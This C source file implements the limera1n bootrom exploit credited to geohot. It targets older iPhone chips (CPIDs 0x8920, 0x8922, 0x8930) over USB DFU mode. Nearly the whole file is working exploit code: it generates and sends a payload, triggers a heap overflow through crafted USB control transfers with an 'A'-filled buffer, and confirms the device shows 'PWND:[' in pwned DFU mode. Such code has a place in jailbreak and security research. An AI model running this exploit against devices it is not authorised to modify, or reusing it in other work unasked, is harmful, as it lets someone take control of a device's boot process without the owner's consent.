/*
 * limera1n.c - limera1n bootrom exploit discovered by geohot.
 * copyright (C) 2020/05/25 dora2ios
 *
 */

#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

#include <limera1n.h>
#include <payload.h>
#include <client.h>

int limera1n_supported(irecv_client_t client) {
    const struct irecv_device_info* info = irecv_get_device_info(client);
    switch(info->cpid) {
        case 0x8920:
            return 0;
        case 0x8922:
            return 0;
        case 0x8930:
            return 0;
        default:
            return -1;
    }
    return 0;
}

int limera1n_exploit(irecv_client_t client) {
    printf("\x1b[1m** \x1b[31mexploiting with limera1n\x1b[39;0m\n");
    printf("\x1b[1m***\x1b[0m based on limera1n exploit (heap overflow) by geohot\n");
    
    unsigned char *payload;
    size_t payload_len;
    unsigned char assert[1];
    unsigned char buf[0x800];
    memset(buf, 'A', 0x800);
    int ret;
    int rom;
    
    uint16_t cpid = irecv_get_cpid();
    
    if(cpid == 0x8920){
        printf("\x1b[34mDetected iPhone 3GS. Checking the Bootrom version.\x1b[39m\n");
        rom = i3gs_bootrom(); // 0:old, 1:new
        if(rom == -1){
            printf("Failed to check bootrom version\n");
            return -1;
        }
        if(rom == 0){
            printf("Bootrom: \x1b[1mold\x1b[0m\n");
        }
        if(rom == 1){
            printf("Bootrom: new\n");
        }
    }
    
    if(cpid != 0x8920){
        rom = 2;
    }
    
    if(rom == -1){
        printf("Failed to get device infomation.\n");
        return -1;
    }
    
    ret = gen_limera1n(cpid, rom, &payload, &payload_len);
    if(ret == -1) {
        printf("Failed to generate payload.\n");
        irecv_close(client);
        return -1;
    }
    
    printf("\x1b[36mSending exploit payload\x1b[39m\n");
    send_data(client, payload, payload_len);
    
    printf("\x1b[36mSending fake data\x1b[39m\n");
    if(irecv_usb_control_transfer(client, 0xA1, 1, 0, 0, assert, 1, 100) != 1){
        printf("Exploit failed! device is NOT in pwned DFU mode.\n");
        return -1;
    }
    
    irecv_usb_control_transfer(client, 0x21, 1, 0, 0, buf, 0x800, 10);
    
    printf("\x1b[36mExecuting exploit\x1b[39m\n");
    irecv_usb_control_transfer(client, 0x21, 2, 0, 0, NULL, 0, 100);
    irecv_reset(client);
    
    printf("\x1b[36mReconnecting to device\x1b[39m\n");
    irecv_close(client);
    client = NULL;
    irecv_open_with_ecid_and_attempts(&client, 0, 5);
    if(!client) {
        printf("Failed to reconnect to device.\n");
        return -1;
    }
    
    irecv_finish_transfer(client);
    printf("\x1b[36mExploit sent\x1b[39m\n");
    
    printf("\x1b[36mReconnecting to device\x1b[39m\n");
    irecv_close(client);
    client = NULL;
    irecv_open_with_ecid_and_attempts(&client, 0, 5);
    if(!client) {
        printf("Failed to reconnect to device.\n");
        return -1;
    }
    
    free(payload);
    
    const struct irecv_device_info* info = irecv_get_device_info(client);
    char* pwnd_str = strstr(info->serial_string, "PWND:[");
    if(!pwnd_str) {
        irecv_close(client);
        printf("Device not in pwned DFU mode.\n");
        return -1;
    }
    printf("\x1b[31;1mDevice is now in pwned DFU mode!\x1b[39;0m\n");
    irecv_close(client);
    return 0;
}

void limera1n_init() {
    exploit_add("limera1n", &limera1n_supported, &limera1n_exploit);
}

